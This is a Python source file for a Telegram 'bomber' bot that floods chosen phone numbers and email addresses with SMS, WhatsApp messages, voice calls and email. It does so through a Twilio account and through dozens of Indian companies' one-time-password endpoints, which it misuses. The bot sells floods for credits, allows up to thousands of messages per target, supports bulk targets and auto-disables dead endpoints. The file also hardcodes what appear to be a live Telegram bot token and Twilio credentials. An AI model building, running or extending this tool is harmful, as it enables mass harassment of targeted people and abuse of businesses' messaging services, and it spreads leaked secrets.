# bot.py
# Telegram bomber — Twilio SMS / WhatsApp / Voice / Email + legacy HTTP endpoints.
# Requires: pip install aiogram aiohttp aiosmtplib
# Contact: @sanjipro5

import asyncio
import aiohttp
import aiohttp.web
import aiosmtplib
import base64
import sqlite3
import secrets
import string
import time
import logging
import os
import csv
import io
import json
from email.mime.text import MIMEText
from email.utils import formataddr, formatdate, make_msgid
from aiogram import Bot, Dispatcher, F, types, BaseMiddleware
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (InlineKeyboardMarkup, InlineKeyboardButton,
                           BufferedInputFile)

# ─────────────────────── CONFIG ───────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "8301089530:AAFNYRfY3vbB7IgPybATo14rsUD4Th-ZONI")
DB_PATH   = os.getenv("DB_PATH", "bot.db")
ADMIN_IDS_ENV = {5851573541, 728373773}
PORT = int(os.getenv("PORT", "10000"))
ADMIN_CONTACT = "@sanjipro5"

DEFAULT_BOMB_COST    = 1
DEFAULT_MAX_COUNT    = 5000
DEFAULT_COOLDOWN     = 30
DEFAULT_CONCURRENCY  = 50
DEFAULT_DAILY_BONUS  = 5
REFERRAL_BONUS       = 3
API_FAIL_THRESHOLD   = 5
LOG_RETENTION_DAYS   = 30
START_TIME           = int(time.time())

# Twilio account
TW_SID   = "ACe768f657677d723d838cc099281279af"
TW_TOKEN = "f68f9159fec3dfaa55b6d29ed99fe92c"
TW_FROM  = "+17372508034"
TW_WA    = "whatsapp:+17372508034"
TW_CONTENT_SID = "HX7cf5a23fe00549e2ed931e272889fb49"
TW_EMAIL_FROM  = f"{TW_SID}@twilio.email"
TW_VOICE_WEBHOOK = "https://webhooks.twilio.com/v1/Voice/Template/voice_speech_recognition"
TW_BASIC = f"{TW_SID}:{TW_TOKEN}"

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("bomber")

# ─────────────────────── DATABASE ───────────────────────
_conn = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=30)
_conn.row_factory = sqlite3.Row
for p in ("journal_mode=WAL","synchronous=NORMAL","busy_timeout=30000"):
    try: _conn.execute(f"PRAGMA {p}")
    except Exception: pass


def _exec(sql, params=(), fetch=None):
    with _conn:
        cur = _conn.execute(sql, params)
        if fetch == "one": return cur.fetchone()
        if fetch == "all": return cur.fetchall()
        return cur.lastrowid


def _col_exists(table, col):
    cur = _conn.execute(f"PRAGMA table_info({table})")
    return any(r["name"] == col for r in cur.fetchall())


# ─── Twilio endpoints (real, working) ───
def twilio_rows():
    return [
        ("sms:twilio_sms", "sms",
         f"https://api.twilio.com/2010-04-01/Accounts/{TW_SID}/Messages.json",
         "POST",
         "To=%2B{target}&From=%2B" + TW_FROM.lstrip("+") + "&Body={msg}",
         f"Content-Type: application/x-www-form-urlencoded\nX-Basic-Auth: {TW_BASIC}"),
        ("sms:twilio_whatsapp", "whatsapp",
         f"https://api.twilio.com/2010-04-01/Accounts/{TW_SID}/Messages.json",
         "POST",
         "To=whatsapp%3A%2B{target}&From=whatsapp%3A%2B" + TW_FROM.lstrip("+")
         + f"&ContentSid={TW_CONTENT_SID}",
         f"Content-Type: application/x-www-form-urlencoded\nX-Basic-Auth: {TW_BASIC}"),
        ("sms:twilio_call", "call",
         f"https://api.twilio.com/2010-04-01/Accounts/{TW_SID}/Calls.json",
         "POST",
         "To=%2B{target}&From=%2B" + TW_FROM.lstrip("+") + f"&Url={TW_VOICE_WEBHOOK}",
         f"Content-Type: application/x-www-form-urlencoded\nX-Basic-Auth: {TW_BASIC}"),
        ("sms:twilio_email", "email",
         "https://comms.twilio.com/v1/Emails",
         "POST",
         json.dumps({
             "from": {"address": TW_EMAIL_FROM, "name": "Support"},
             "to": [{"address": "{target}"}],
             "content": {"subject": "{msg}",
                         "html": "<p><b>{msg}</b></p>"}
         }),
         f"Content-Type: application/json\nX-Basic-Auth: {TW_BASIC}"),
    ]


# ─── Legacy OTP endpoints (many dead, auto-disable handles them) ───
LEGACY_ENDPOINTS = [
    ("svc:OYO","POST","https://www.oyorooms.com/api/pwa/generateotp?locale=en",
     {"Content-Type":"text/plain;charset=UTF-8"},
     {"phone":"{target}","country_code":"+91","nod":4}),
    ("svc:ConfirmTkt","GET",
     "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={target}",{},{}),
    ("svc:Zomato","POST","https://www.zomato.com/webroutes/auth/login",
     {"Content-Type":"application/json"},
     {"country_id":1,"phone":"{target}","verification_type":"sms","method":"phone"}),
    ("svc:RedBus","GET",
     "https://m.redbus.in/api/getOtp?number={target}&cc=91&whatsAppOpted=undefined",{},{}),
    ("svc:Purplle","GET",
     "https://www.purplle.com/api/account/authorization/send_otp?phone={target}&action=register",{},{}),
    ("svc:Lenskart","POST","https://api.lenskart.com/v2/customers/sendOtp",
     {"Content-Type":"application/json;charset=UTF-8"},{"telephone":"{target}"}),
    ("svc:Nykaa","POST","https://www.nykaa.com/app-api/index.php/customer/send_otp",
     {"Content-Type":"application/x-www-form-urlencoded"},
     {"_raw":"source=sms&app_version=3.0.9&mobile_number={target}&platform=ANDROID&domain=nykaa"}),
    ("svc:BigBasket","POST",
     "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/",
     {"Content-Type":"application/json"},{"identifier":"{target}"}),
    ("svc:Swiggy","POST","https://www.swiggy.com/mapi/auth/signup",
     {"Content-Type":"application/json"},
     {"name":"User","email":"user@example.com","password":"Pass123!",
      "referral_code":"","mobile":"{target}",
      "_csrf":"jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk"}),
    ("svc:Dream11","POST","https://www.dream11.com/graphql/mutation/pwa/register",
     {"Content-Type":"application/json"},
     {"query":'mutation{registerSendOTPMutation(email:"u@e.com" mobileNumber:"{target}" password:"Pass123!" site:""){message}}'}),
    ("svc:My11Circle","POST","https://www.my11circle.com/api/fl/auth/v3/getOtp",
     {"Content-Type":"application/json;charset=UTF-8"},{"mobile":"{target}"}),
    ("svc:RummyCircle","POST","https://www.rummycircle.com/api/fl/auth/v3/getOtp",
     {"Content-Type":"application/json"},{"mobile":"{target}","isPlaycircle":False}),
    ("svc:PharmEasy","POST","https://pharmeasy.in/api/v2/auth/send-otp",
     {"Content-Type":"application/json"},{"phone":"{target}"}),
    ("svc:Vedantu","POST","https://user.vedantu.com/user/preLoginVerification",
     {"Content-Type":"application/json"},
     {"email":None,"phoneCode":"+91","phoneNumber":"{target}","ver":"11.345"}),
    ("svc:Unacademy","POST","https://unacademy.com/api/v3/user/user_check/",
     {"Content-Type":"application/json"},
     {"phone":"{target}","country_code":"IN","otp_type":1,"email":"",
      "send_otp":True,"is_un_teach_user":False}),
    ("svc:Doubtnut","POST","https://api.doubtnut.com/v4/student/login",
     {"Content-Type":"application/json; charset=utf-8"},
     {"phone_number":"{target}","language":"en"}),
    ("svc:PenPencil","POST",
     "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
     {"Content-Type":"application/json; charset=utf-8"},
     {"organizationId":"5eb393ee95fab7468a79d189","mobile":"{target}"}),
    ("svc:Entri","POST","https://entri.app/api/v3/users/check-phone/",
     {"Content-Type":"application/json"},{"phone":"{target}"}),
    ("svc:Cosmofeed","POST","https://prod.api.cosmofeed.com/api/user/authenticate",
     {"Content-Type":"application/json"},{"phone":"{target}","version":"1.4.28"}),
    ("svc:Aakash","POST","https://antheapi.aakash.ac.in/api/generate-lead-otp",
     {"Content-Type":"application/json"},
     {"mobile_number":"{target}","activity_type":"aakash-myadmission"}),
    ("svc:DealShare","POST",
     "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
     {"Content-Type":"application/json"},{"mobile":"{target}","hashCode":"k387IsBaTmn"}),
    ("svc:Snapmint","POST","https://api.snapmint.com/v1/public/sign_up",
     {"Content-Type":"application/json"},{"phone":"{target}"}),
    ("svc:Housing","POST","https://login.housing.com/api/v2/send-otp",
     {"Content-Type":"application/json"},{"phone":"{target}","country_url_name":"in"}),
    ("svc:RentoMojo","POST",
     "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
     {"Content-Type":"application/json"},{"phone":"{target}"}),
    ("svc:Khatabook","POST","https://api.khatabook.com/v1/auth/request-otp",
     {"Content-Type":"application/json"},
     {"phone":"{target}","app_signature":"wk+avHrHZf2"}),
    ("svc:MamaEarth","POST","https://auth.mamaearth.in/v1/auth/initiate-signup",
     {"Content-Type":"application/json"},{"mobile":"{target}"}),
    ("svc:Kredily","POST","https://app.kredily.com/ws/v1/accounts/send-otp/",
     {"Content-Type":"application/json"},{"mobile":"{target}"}),
    ("svc:Moglix","POST","https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
     {"Content-Type":"application/json"},{"mobile":"{target}","buildVersion":"24.0"}),
    ("svc:TrulyMadly","POST",
     "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
     {"Content-Type":"application/json"},{"mobile":"{target}","locale":"IN"}),
    ("svc:Apna","POST","https://production.apna.co/api/userprofile/v1/otp/",
     {"Content-Type":"application/json"},{"mobile":"{target}","hash_type":"play_store"}),
    ("svc:Rapido","POST","https://customer.rapido.bike/api/otp",
     {"Content-Type":"application/json"},{"mobile":"{target}"}),
    ("svc:Vyapar","GET",
     "https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={target}",{},{}),
    ("svc:WorkIndia","GET",
     "https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={target}&version_number=623",{},{}),
]


def _body_to_string(d):
    if not d: return ""
    if isinstance(d, str): return d
    if isinstance(d, dict):
        if "_raw" in d: return str(d["_raw"])
        return json.dumps(d, separators=(",", ":"), ensure_ascii=False)
    return str(d)


def _headers_to_string(h):
    if not h: return ""
    if isinstance(h, str): return h
    return "\n".join(f"{k}: {v}" for k, v in h.items())


def seed_all_endpoints():
    # Twilio rows are bot-managed — always refresh
    with _conn:
        for name, *_ in twilio_rows():
            _conn.execute("DELETE FROM apis WHERE name=?", (name,))
    inserted = 0
    for name, cat, url, method, body, headers in twilio_rows():
        _exec("INSERT INTO apis(name,channel,category,url,method,body,headers,"
              "active,created_at) VALUES(?,?,?,?,?,?,?,?,?)",
              (name, "http", cat, url, method, body, headers, 1, int(time.time())))
        inserted += 1
    for name, method, url, headers, data in LEGACY_ENDPOINTS:
        if _exec("SELECT 1 FROM apis WHERE name=?", (name,), fetch="one"):
            continue
        _exec("INSERT INTO apis(name,channel,category,url,method,body,headers,"
              "active,created_at) VALUES(?,?,?,?,?,?,?,?,?)",
              (name, "http", "legacy", url, method, _body_to_string(data),
               _headers_to_string(headers), 1, int(time.time())))
        inserted += 1
    log.info("seed: %d endpoints ready", inserted)


def init_db():
    _conn.executescript("""
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
        credits INTEGER DEFAULT 0, banned INTEGER DEFAULT 0,
        last_bomb INTEGER DEFAULT 0, total_bombs INTEGER DEFAULT 0,
        last_daily INTEGER DEFAULT 0, referred_by INTEGER,
        ref_count INTEGER DEFAULT 0, vip_cost INTEGER DEFAULT 0,
        created_at INTEGER);
    CREATE TABLE IF NOT EXISTS admins (
        user_id INTEGER PRIMARY KEY, added_by INTEGER, added_at INTEGER);
    CREATE TABLE IF NOT EXISTS redeem_codes (
        code TEXT PRIMARY KEY, amount INTEGER NOT NULL, max_uses INTEGER NOT NULL,
        used INTEGER DEFAULT 0, created_by INTEGER, created_at INTEGER,
        active INTEGER DEFAULT 1);
    CREATE TABLE IF NOT EXISTS redeem_uses (
        code TEXT, user_id INTEGER, used_at INTEGER,
        PRIMARY KEY (code, user_id));
    CREATE TABLE IF NOT EXISTS apis (
        id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT UNIQUE,
        channel TEXT DEFAULT 'http', category TEXT DEFAULT 'legacy',
        url TEXT NOT NULL, method TEXT DEFAULT 'GET', body TEXT DEFAULT '',
        headers TEXT DEFAULT '', active INTEGER DEFAULT 1,
        fail_streak INTEGER DEFAULT 0, ok_count INTEGER DEFAULT 0,
        fail_count INTEGER DEFAULT 0, created_at INTEGER);
    CREATE TABLE IF NOT EXISTS smtp_accounts (
        id INTEGER PRIMARY KEY AUTOINCREMENT, host TEXT, port INTEGER,
        username TEXT, password TEXT, from_name TEXT DEFAULT '',
        use_tls INTEGER DEFAULT 1, active INTEGER DEFAULT 1,
        fail_streak INTEGER DEFAULT 0, ok_count INTEGER DEFAULT 0,
        fail_count INTEGER DEFAULT 0);
    CREATE TABLE IF NOT EXISTS bomb_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, target TEXT,
        count INTEGER, msg TEXT, ok INTEGER, fail INTEGER, category TEXT,
        ts INTEGER);
    CREATE TABLE IF NOT EXISTS blacklist (
        target TEXT PRIMARY KEY, added_by INTEGER, added_at INTEGER);
    CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
    CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER,
        action TEXT, detail TEXT, ts INTEGER);
    """)

    # migrations for older DBs
    if not _col_exists("apis", "category"):
        _conn.execute("ALTER TABLE apis ADD COLUMN category TEXT DEFAULT 'legacy'")
    if not _col_exists("bomb_history", "category"):
        _conn.execute("ALTER TABLE bomb_history ADD COLUMN category TEXT")

    for k, v in (("bomb_cost", DEFAULT_BOMB_COST),
                 ("max_count", DEFAULT_MAX_COUNT),
                 ("cooldown", DEFAULT_COOLDOWN),
                 ("concurrency", DEFAULT_CONCURRENCY),
                 ("daily_bonus", DEFAULT_DAILY_BONUS),
                 ("referral_bonus", REFERRAL_BONUS),
                 ("maintenance", 0),
                 ("country_code", "91")):
        _conn.execute("INSERT OR IGNORE INTO settings(key,value) VALUES(?,?)",
                      (k, str(v)))

    if _exec("SELECT COUNT(*) c FROM admins", fetch="one")["c"] == 0:
        for uid in ADMIN_IDS_ENV:
            _exec("INSERT OR IGNORE INTO admins(user_id,added_by,added_at) "
                  "VALUES(?,?,?)", (uid, 0, int(time.time())))

    seed_all_endpoints()


def setting(k, cast=str):
    row = _exec("SELECT value FROM settings WHERE key=?", (k,), fetch="one")
    return cast(row["value"]) if row else None


def set_setting(k, v):
    _exec("INSERT INTO settings(key,value) VALUES(?,?) "
          "ON CONFLICT(key) DO UPDATE SET value=excluded.value", (k, str(v)))


def get_user(uid): return _exec("SELECT * FROM users WHERE user_id=?", (uid,), fetch="one")


def ensure_user(u):
    row = get_user(u.id)
    if not row:
        _exec("INSERT INTO users(user_id,username,first_name,credits,created_at) "
              "VALUES(?,?,?,?,?)", (u.id, u.username or "", u.first_name or "", 0, int(time.time())))
        row = get_user(u.id)
    else:
        _exec("UPDATE users SET username=?, first_name=? WHERE user_id=?",
              (u.username or "", u.first_name or "", u.id))
    return row


def add_credits(uid, amount):
    _exec("UPDATE users SET credits=credits+? WHERE user_id=?", (amount, uid))


def take_credits(uid, amount):
    with _conn:
        cur = _conn.execute(
            "UPDATE users SET credits=credits-? WHERE user_id=? AND credits>=?",
            (amount, uid, amount))
        return cur.rowcount > 0


def log_action(uid, action, detail=""):
    _exec("INSERT INTO logs(user_id,action,detail,ts) VALUES(?,?,?,?)",
          (uid, action, detail, int(time.time())))


def prune_logs():
    cutoff = int(time.time()) - LOG_RETENTION_DAYS * 86400
    with _conn:
        _conn.execute("DELETE FROM logs WHERE ts < ?", (cutoff,))


def gen_code(n=10):
    return "".join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(n))


def is_admin(uid):
    return _exec("SELECT 1 FROM admins WHERE user_id=?", (uid,), fetch="one") is not None


def is_blacklisted(target):
    return _exec("SELECT 1 FROM blacklist WHERE target=?", (target,), fetch="one") is not None


# ─────────────────────── HELPERS ───────────────────────
def fmt_phone(raw):
    """Normalize phone → digits only, no +. Adds country code if 10 digits."""
    t = raw.strip()
    if t.startswith("+"):
        t = "+" + "".join(c for c in t[1:] if c.isdigit())
    else:
        t = "".join(c for c in t if c.isdigit())
    digits = t.lstrip("+")
    if len(digits) == 10:
        digits = setting("country_code") + digits
    return digits


def looks_like_email(s):
    return "@" in s and "." in s.split("@")[-1]


# ─────────────────────── MIDDLEWARE ───────────────────────
class AutoReg(BaseMiddleware):
    async def __call__(self, handler, event, data):
        u = getattr(event, "from_user", None)
        if u and not u.is_bot: ensure_user(u)
        return await handler(event, data)


# ─────────────────────── BOMBER CORE ───────────────────────
def _render(t, target, msg):
    if not t: return ""
    return t.replace("{target}", target).replace("{phone}", target).replace("{msg}", msg)


def _parse_headers(raw):
    out = {}
    if not raw: return out
    for line in raw.splitlines():
        if ":" in line:
            k, v = line.split(":", 1)
            out[k.strip()] = v.strip()
    return out


async def _hit_http(session, row, target, msg):
    url = _render(row["url"], target, msg)
    method = (row["method"] or "GET").upper()
    body = _render(row["body"], target, msg)
    headers = _parse_headers(row["headers"])

    # Basic auth support
    if "X-Basic-Auth" in headers:
        creds = headers.pop("X-Basic-Auth")
        headers["Authorization"] = "Basic " + base64.b64encode(creds.encode()).decode()

    timeout = aiohttp.ClientTimeout(total=12)
    try:
        data_bytes = body.encode("utf-8") if body else None
        if method == "POST":
            async with session.post(url, data=data_bytes, headers=headers, timeout=timeout) as r:
                await r.read(); return 200 <= r.status < 400
        elif method == "PUT":
            async with session.put(url, data=data_bytes, headers=headers, timeout=timeout) as r:
                await r.read(); return 200 <= r.status < 400
        else:
            async with session.get(url, headers=headers, timeout=timeout) as r:
                await r.read(); return 200 <= r.status < 400
    except Exception:
        return False


async def _send_email(smtp_row, target, msg):
    try:
        m = MIMEText(msg)
        m["Subject"] = "Notification"
        m["From"] = formataddr((smtp_row["from_name"] or smtp_row["username"], smtp_row["username"]))
        m["To"] = target
        m["Date"] = formatdate(localtime=True)
        m["Message-ID"] = make_msgid()
        port = smtp_row["port"]
        if port == 465:
            c = aiosmtplib.SMTP(hostname=smtp_row["host"], port=port, timeout=20, use_tls=True)
            await c.connect()
        else:
            c = aiosmtplib.SMTP(hostname=smtp_row["host"], port=port, timeout=20, use_tls=False)
            await c.connect()
            if smtp_row["use_tls"]: await c.starttls()
        await c.login(smtp_row["username"], smtp_row["password"])
        await c.send_message(m); await c.quit()
        return True
    except Exception:
        return False


def _update_api_health(api_id, ok):
    try:
        if ok:
            _exec("UPDATE apis SET ok_count=ok_count+1, fail_streak=0 WHERE id=?", (api_id,))
        else:
            _exec("UPDATE apis SET fail_count=fail_count+1, fail_streak=fail_streak+1 WHERE id=?", (api_id,))
            r = _exec("SELECT fail_streak FROM apis WHERE id=?", (api_id,), fetch="one")
            if r and r["fail_streak"] >= API_FAIL_THRESHOLD:
                _exec("UPDATE apis SET active=0 WHERE id=?", (api_id,))
    except Exception: pass


def _update_smtp_health(sid, ok):
    try:
        if ok: _exec("UPDATE smtp_accounts SET ok_count=ok_count+1, fail_streak=0 WHERE id=?", (sid,))
        else:
            _exec("UPDATE smtp_accounts SET fail_count=fail_count+1, fail_streak=fail_streak+1 WHERE id=?", (sid,))
            r = _exec("SELECT fail_streak FROM smtp_accounts WHERE id=?", (sid,), fetch="one")
            if r and r["fail_streak"] >= API_FAIL_THRESHOLD:
                _exec("UPDATE smtp_accounts SET active=0 WHERE id=?", (sid,))
    except Exception: pass


async def bomb_worker(targets, count, msg, categories):
    """targets: list of strings. categories: list of category names."""
    if isinstance(targets, str): targets = [targets]
    placeholders = ",".join("?" * len(categories))
    http_apis = _exec(
        f"SELECT * FROM apis WHERE active=1 AND channel='http' AND category IN ({placeholders})",
        tuple(categories), fetch="all")
    smtp_accounts = []
    if "email" in categories or "smtp" in categories:
        smtp_accounts = _exec("SELECT * FROM smtp_accounts WHERE active=1", fetch="all")

    if not http_apis and not smtp_accounts:
        return 0, 0, "no active delivery channels for that category"

    conc = setting("concurrency", int) or DEFAULT_CONCURRENCY
    global_sem = asyncio.Semaphore(conc)
    api_sems = {a["id"]: asyncio.Semaphore(8) for a in http_apis}
    smtp_sems = {s["id"]: asyncio.Semaphore(3) for s in smtp_accounts}

    ok = fail = 0
    lock = asyncio.Lock()
    connector = aiohttp.TCPConnector(limit=300, limit_per_host=20)

    async with aiohttp.ClientSession(connector=connector) as session:
        async def one(i):
            nonlocal ok, fail
            tgt_raw = targets[i % len(targets)]
            # pick a channel
            async with global_sem:
                use_smtp = smtp_accounts and looks_like_email(tgt_raw) and "smtp" in categories
                if http_apis and not use_smtp:
                    api = http_apis[(i // len(targets)) % len(http_apis)]
                    # format target per category
                    if api["category"] == "email":
                        tgt = tgt_raw
                    else:
                        tgt = fmt_phone(tgt_raw)
                    async with api_sems[api["id"]]:
                        r = await _hit_http(session, api, tgt, msg)
                    _update_api_health(api["id"], r)
                elif smtp_accounts:
                    sm = smtp_accounts[(i // len(targets)) % len(smtp_accounts)]
                    async with smtp_sems[sm["id"]]:
                        r = await _send_email(sm, tgt_raw, msg)
                    _update_smtp_health(sm["id"], r)
                else:
                    r = False
                async with lock:
                    if r: ok += 1
                    else: fail += 1

        await asyncio.gather(*(one(i) for i in range(count)))
    return ok, fail, None


# ─────────────────────── BOT / DISPATCHER ───────────────────────
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())
dp.message.middleware(AutoReg())
dp.callback_query.middleware(AutoReg())


class UserFSM(StatesGroup):
    bomb_target = State()
    bomb_count = State()
    bomb_custom_count = State()
    redeem_code = State()


class AdminFSM(StatesGroup):
    add_credits_uid = State()
    add_credits_amt = State()
    ded_credits_uid = State()
    ded_credits_amt = State()
    redeem_amount = State()
    redeem_uses = State()
    api_name = State()
    api_category = State()
    api_url = State()
    api_method = State()
    api_body = State()
    api_headers = State()
    smtp_host = State()
    smtp_port = State()
    smtp_user = State()
    smtp_pass = State()
    smtp_name = State()
    broadcast = State()
    find_user = State()
    edit_setting = State()
    blacklist_add = State()
    vip_uid = State()
    vip_cost = State()
    add_admin_id = State()
    remove_admin_id = State()
    msg_template = State()


# ─────────────────────── KEYBOARDS ───────────────────────
def main_menu_kb(admin=False):
    rows = [
        [InlineKeyboardButton(text="💣 Start Bomb",  callback_data="m:bomb"),
         InlineKeyboardButton(text="💰 Balance",     callback_data="m:bal")],
        [InlineKeyboardButton(text="🎁 Redeem",      callback_data="m:redeem"),
         InlineKeyboardButton(text="📜 History",     callback_data="m:hist")],
        [InlineKeyboardButton(text="🎉 Daily Bonus", callback_data="m:daily"),
         InlineKeyboardButton(text="📊 Stats",       callback_data="m:stats")],
        [InlineKeyboardButton(text="📖 Help",        callback_data="m:help"),
         InlineKeyboardButton(text="📝 Example",     callback_data="m:example")],
        [InlineKeyboardButton(text="📞 Contact Admin",
                              url=f"https://t.me/{ADMIN_CONTACT.lstrip('@')}")],
    ]
    if admin:
        rows.append([InlineKeyboardButton(text="🛠 Admin Panel", callback_data="a:home")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def cancel_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Cancel", callback_data="m:cancel")]])


def back_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🏠 Main Menu", callback_data="m:home")]])


def channel_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📱 SMS",       callback_data="m:chan:sms"),
         InlineKeyboardButton(text="💬 WhatsApp",  callback_data="m:chan:whatsapp")],
        [InlineKeyboardButton(text="📞 Voice Call",callback_data="m:chan:call"),
         InlineKeyboardButton(text="📧 Email",     callback_data="m:chan:email")],
        [InlineKeyboardButton(text="🔥 All Channels", callback_data="m:chan:all")],
        [InlineKeyboardButton(text="❌ Cancel", callback_data="m:cancel")],
    ])


def count_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="10",   callback_data="m:count:10"),
         InlineKeyboardButton(text="50",   callback_data="m:count:50"),
         InlineKeyboardButton(text="100",  callback_data="m:count:100")],
        [InlineKeyboardButton(text="250",  callback_data="m:count:250"),
         InlineKeyboardButton(text="500",  callback_data="m:count:500"),
         InlineKeyboardButton(text="1000", callback_data="m:count:1000")],
        [InlineKeyboardButton(text="✍️ Custom Count", callback_data="m:count:custom")],
        [InlineKeyboardButton(text="❌ Cancel", callback_data="m:cancel")],
    ])


# ─────────────────────── START ───────────────────────
@dp.message(CommandStart())
async def cmd_start(m, state):
    await state.clear()
    u = ensure_user(m.from_user)
    if u["banned"]: return await m.answer("🚫 You are banned.")
    await m.answer(
        f"👋 <b>Welcome {m.from_user.first_name}</b>\n\n"
        f"🆔 <code>{m.from_user.id}</code>\n"
        f"💳 Credits: <b>{u['credits']}</b>\n\n"
        f"Use the buttons below.",
        reply_markup=main_menu_kb(is_admin(m.from_user.id)))


@dp.message(Command("admin"))
async def cmd_admin(m, state):
    await state.clear()
    if not is_admin(m.from_user.id): return
    await m.answer("🛠 <b>Admin Panel</b>", reply_markup=admin_kb())


@dp.callback_query(F.data == "m:home")
async def cb_home(c, state):
    await state.clear()
    u = get_user(c.from_user.id)
    await c.message.edit_text(
        f"🏠 <b>Main Menu</b>\n\n💳 Credits: <b>{u['credits']}</b>\n"
        f"📊 Bombs: <b>{u['total_bombs']}</b>",
        reply_markup=main_menu_kb(is_admin(c.from_user.id)))
    await c.answer()


@dp.callback_query(F.data == "m:cancel")
async def cb_cancel(c, state):
    await state.clear()
    await c.message.edit_text("❌ Cancelled.",
                              reply_markup=main_menu_kb(is_admin(c.from_user.id)))
    await c.answer()


# ─────────────────────── INFO SCREENS ───────────────────────
@dp.callback_query(F.data == "m:bal")
async def cb_bal(c):
    u = get_user(c.from_user.id)
    await c.message.edit_text(
        f"💰 <b>Account</b>\n\n"
        f"🆔 <code>{u['user_id']}</code>\n"
        f"💳 Credits: <b>{u['credits']}</b>\n"
        f"📊 Total bombs: <b>{u['total_bombs']}</b>\n"
        f"🔗 Referrals: <b>{u['ref_count']}</b>",
        reply_markup=back_kb())
    await c.answer()


@dp.callback_query(F.data == "m:help")
async def cb_help(c):
    await c.message.edit_text(
        "📖 <b>Help</b>\n\n"
        "<b>💣 Start Bomb</b>\n"
        "1. Send target (phone number or email)\n"
        "2. Pick a channel:\n"
        "  📱 SMS — Twilio SMS to the target\n"
        "  💬 WhatsApp — Twilio WhatsApp template\n"
        "  📞 Voice — Twilio automated call\n"
        "  📧 Email — Twilio Email API\n"
        "  🔥 All — every channel, every request\n"
        "3. Pick count or ✍️ Custom Count\n"
        "4. Bot fires\n\n"
        "<b>Bulk targets:</b> separate with commas\n"
        "<code>8824302646,9876543210,14155551234</code>\n\n"
        "10-digit numbers get +91 prepended automatically.",
        reply_markup=back_kb())
    await c.answer()


@dp.callback_query(F.data == "m:example")
async def cb_example(c):
    await c.message.edit_text(
        "📝 <b>Example</b>\n\n"
        "Tap <b>💣 Start Bomb</b>\n\n"
        "Bot: <i>Send target</i>\n"
        "You: <code>8824302646</code>\n"
        "     <i>or bulk:</i> <code>8824302646,9876543210</code>\n\n"
        "Bot: <i>Pick channel</i>\n"
        "You: <b>💬 WhatsApp</b>\n\n"
        "Bot: <i>Pick count</i>\n"
        "You: <b>✍️ Custom Count</b> → <code>1208</code>\n\n"
        "Bot: fires 1208 requests → reports Sent/OK result.",
        reply_markup=back_kb())
    await c.answer()


@dp.callback_query(F.data == "m:hist")
async def cb_hist(c):
    rows = _exec("SELECT * FROM bomb_history WHERE user_id=? ORDER BY ts DESC LIMIT 10",
                 (c.from_user.id,), fetch="all")
    if not rows:
        txt = "📜 No history."
    else:
        lines = []
        for r in rows:
            t = time.strftime("%m-%d %H:%M", time.localtime(r["ts"]))
            cat = r["category"] or "?"
            lines.append(f"• [{cat}] <code>{r['target']}</code> x{r['count']} "
                         f"→ {r['ok']}✅ {r['fail']}❌ ({t})")
        txt = "📜 <b>Last 10 bombs</b>\n\n" + "\n".join(lines)
    await c.message.edit_text(txt, reply_markup=back_kb())
    await c.answer()


@dp.callback_query(F.data == "m:stats")
async def cb_public_stats(c):
    users = _exec("SELECT COUNT(*) c FROM users", fetch="one")["c"]
    bombs = _exec("SELECT COALESCE(SUM(total_bombs),0) s FROM users", fetch="one")["s"]
    total_apis = _exec("SELECT COUNT(*) c FROM apis", fetch="one")["c"]
    active_apis = _exec("SELECT COUNT(*) c FROM apis WHERE active=1", fetch="one")["c"]
    per_cat = _exec("SELECT category, COUNT(*) c FROM apis WHERE active=1 GROUP BY category",
                    fetch="all")
    cat_lines = [f"  • {r['category'] or '?'}: <b>{r['c']}</b>" for r in per_cat]
    await c.message.edit_text(
        f"📊 <b>Stats</b>\n\n"
        f"👥 Users: <b>{users}</b>\n"
        f"💥 Total bombs fired: <b>{bombs}</b>\n"
        f"🔌 Active endpoints: <b>{active_apis}/{total_apis}</b>\n\n"
        f"<b>By channel:</b>\n" + ("\n".join(cat_lines) or "  none"),
        reply_markup=back_kb())
    await c.answer()


@dp.callback_query(F.data == "m:daily")
async def cb_daily(c):
    u = get_user(c.from_user.id)
    now = int(time.time())
    if now - u["last_daily"] < 86400:
        wait = 86400 - (now - u["last_daily"])
        h, rem = divmod(wait, 3600); mm = rem // 60
        await c.answer(f"⏳ Next in {h}h {mm}m", show_alert=True)
        return
    bonus = setting("daily_bonus", int)
    add_credits(c.from_user.id, bonus)
    _exec("UPDATE users SET last_daily=? WHERE user_id=?", (now, c.from_user.id))
    log_action(c.from_user.id, "daily", f"+{bonus}")
    u2 = get_user(c.from_user.id)
    await c.answer(f"🎉 +{bonus} credits!", show_alert=True)
